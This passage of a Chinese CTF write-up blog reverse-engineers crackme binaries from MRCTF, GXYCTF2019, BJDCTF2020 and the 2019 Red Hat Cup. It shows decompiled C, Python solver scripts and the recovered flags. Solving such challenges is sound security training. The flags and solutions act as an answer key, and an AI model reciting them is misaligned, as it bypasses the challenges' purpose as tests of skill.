  <span class="token punctuation">&#125;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">32</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    byte_414040<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Str<span class="token punctuation">[</span>dword_40F040<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    byte_414040<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token function">LOBYTE</span><span class="token punctuation">(</span>dword_40F040<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">32</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> byte_40F0E0<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> byte_414040<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Wrong!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Right!Good Job!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Here is your flag: %s\n"</span><span class="token punctuation">,</span> Str<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注意到关键的数据有两个</p>
<pre class="line-numbers language-none"><code class="language-none">dword_40F040 &#x3D; [0x9, 0x0A, 0x0F, 0x17, 0x7, 0x18, 0x0C, 0x6, 0x1, 0x10, 0x3, 0x11, 0x20, 0x1D, 0x0B, 0x1E, 0x1B, 0x16,
                0x4, 0x0D, 0x13, 0x14, 0x15, 0x2, 0x19, 0x5, 0x1F, 0x8, 0x12, 0x1A, 0x1C, 0x0E, 0x00]
byte_40F0E0 &#x3D; [0x67, 0x79, 0x7B, 0x7F, 0x75, 0x2B, 0x3C, 0x52, 0x53, 0x79, 0x57, 0x5E, 0x5D, 0x42, 0x7B, 0x2D, 0x2A,
               0x66, 0x42, 0x7E, 0x4C, 0x57, 0x79, 0x41, 0x6B, 0x7E, 0x65, 0x3C, 0x5C, 0x45, 0x6F, 0x62, 0x4D]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>Str</code>是flag，这里先将<code>dword_40F040</code>作为flag字符串的下标，然后<code>byte_40F0E0 = flag[dword_40F040] ^ dword_40F040</code></p>
<p>意思就是这么个意思啦，直接逆，由异或的特性易知<code>flag[dword_40F040] = byte_40F0E0 ^ dword_40F040</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">dword_40F040 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x9</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x7</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span>
                <span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x2</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x5</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>
byte_40F0E0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span>
               <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">]</span>

flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>byte_40F0E0<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>byte_40F0E0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag<span class="token punctuation">[</span>dword_40F040<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> byte_40F0E0<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> dword_40F040<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#  MRCTF&#123;Tr4nsp0sltiON_Clph3r_1s_3z&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以说是右手就行。</p>
<p><strong>注意下标的那个数组的最后一位补上0x00，要不不满足33位的条件，把那个最后的0x08换成0x00</strong></p>
<h2 id="Linux下文件逆向-elf文件逆向"><a href="#Linux下文件逆向-elf文件逆向" class="headerlink" title="Linux下文件逆向(elf文件逆向)"></a>Linux下文件逆向(elf文件逆向)</h2><h3 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h3><p><strong>关键代码寻找与审计</strong></p>
<p>这题应该是可以使用ida &amp; ubuntu实现动态调试的，但是我一看配置环境还要浪费许多时间，就直接进行逆向分析好了。下面的是get_flag()函数的代码</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-3Ch]</span>
  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-38h]</span>
  __int64 s<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-30h] BYREF</span>
  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-28h]</span>
  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-8h]</span>

  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v0 <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">srand</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">200</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OK, it's flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x28uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> f1<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//f1=GXY&#123;do_not_</span>
        <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>f2<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//f2=</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Solar not like you"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Solar want a girlfriend"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>
        s <span class="token operator">=</span> <span class="token number">0x7F666F6067756369LL</span><span class="token punctuation">;</span>
        v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>f2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> j <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>f2 <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>
          <span class="token keyword">else</span>
            <span class="token operator">--</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>f2 <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">default</span><span class="token operator">:</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"emmm,you can't find flag 23333"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v6<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面的switch需要正确排序才能获得正确的flag，这里很明显case1是最后一个，前两个猜测分别是case4和case5，就有下面的脚本</p>
<p><strong>逆向脚本</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">flag1 <span class="token operator">=</span> <span class="token string">'GXY&#123;do_not_'</span>
flag2 <span class="token operator">=</span> <span class="token string">''</span>
s <span class="token operator">=</span> <span class="token string">'7F666F6067756369'</span>
res1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    temp <span class="token operator">=</span> <span class="token string">'0x'</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>
    res1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
res1 <span class="token operator">=</span> res1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>   <span class="token comment"># 这里似乎是因为大小端排序的问题似乎，然后上面的内容需要简单地逆一下</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>res1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        flag2 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>res1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        flag2 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>res1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag1 <span class="token operator">+</span> flag2<span class="token punctuation">)</span>
<span class="token comment"># GXY&#123;do_not_hate_me&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="BJDCTF2020-JustRE"><a href="#BJDCTF2020-JustRE" class="headerlink" title="[BJDCTF2020]JustRE"></a>[BJDCTF2020]JustRE</h3><p><strong>查PE</strong></p>
<p><img src="/2021/05/28/CTF/image-20210530113755795.png" alt="PE信息"></p>
<p>emmm，直接拖入ida32看看吧</p>
<p><strong>得flag</strong></p>
<p>这种带有GUI的程序逆向主要就是先看字符串信息，直接查找字符串找到flag的一部分，再找到变换flag的关键函数</p>
<p><img src="/2021/05/28/CTF/image-20210530114039094.png" alt="image-20210530114039094"></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">INT_PTR __stdcall <span class="token function">DialogFunc</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> UINT a2<span class="token punctuation">,</span> WPARAM a3<span class="token punctuation">,</span> LPARAM a4<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  CHAR String<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-64h] BYREF</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">!=</span> <span class="token number">272</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">!=</span> <span class="token number">273</span> <span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>a3 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>a3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">sprintf</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> Format<span class="token punctuation">,</span> <span class="token operator">++</span>dword_4099F0<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_4099F0 <span class="token operator">==</span> <span class="token number">19999</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token function">sprintf</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> <span class="token string">" BJD&#123;%d%d2069a45792d233ac&#125;"</span><span class="token punctuation">,</span> <span class="token number">19999</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">SetWindowTextA</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> String<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token function">SetWindowTextA</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> String<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">EndDialog</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>根据下面的得到flag</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">sprintf</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> <span class="token string">" BJD&#123;%d%d2069a45792d233ac&#125;"</span><span class="token punctuation">,</span> <span class="token number">19999</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">BJD&#123;1999902069a45792d233ac&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="2019红帽杯-easyRE"><a href="#2019红帽杯-easyRE" class="headerlink" title="[2019红帽杯]easyRE"></a>[2019红帽杯]easyRE</h3><p>提示了是elf文件，直接ida64打开之后一路跟踪到关键代码</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sub_4009C6</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-114h]</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-110h]</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-108h]</span>
  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-100h]</span>
  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-F8h]</span>
  __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-F0h]</span>
  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-E8h]</span>
  __int64 v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-E0h]</span>
  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-D8h]</span>
  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-D0h]</span>
  __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-C8h]</span>
  <span class="token keyword">char</span> v12<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+60h] [rbp-C0h] BYREF</span>
  <span class="token keyword">char</span> v13<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+6Dh] [rbp-B3h] BYREF</span>
  <span class="token keyword">char</span> v14<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+71h] [rbp-AFh] BYREF</span>
  <span class="token keyword">char</span> v15<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+90h] [rbp-90h] BYREF</span>
  <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+B0h] [rbp-70h]</span>
  <span class="token keyword">char</span> v17<span class="token punctuation">;</span> <span class="token comment">// [rsp+B4h] [rbp-6Ch]</span>
  <span class="token keyword">char</span> v18<span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+C0h] [rbp-60h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v19<span class="token punctuation">;</span> <span class="token comment">// [rsp+108h] [rbp-18h]</span>

  v19 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"Iodl>Qnb(ocy"</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v12<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>
  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v13<span class="token punctuation">,</span> <span class="token string">"y.i"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>
  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v14<span class="token punctuation">,</span> <span class="token string">"d`3w&#125;wek9&#123;iy=~yL@EC"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v14<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>v15<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v15<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v16 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v17 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">sub_4406E0</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v15<span class="token punctuation">,</span> <span class="token number">37LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v17 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_424BA0</span><span class="token punctuation">(</span>v15<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">36</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token function">sub_424BA0</span><span class="token punctuation">(</span>v15<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
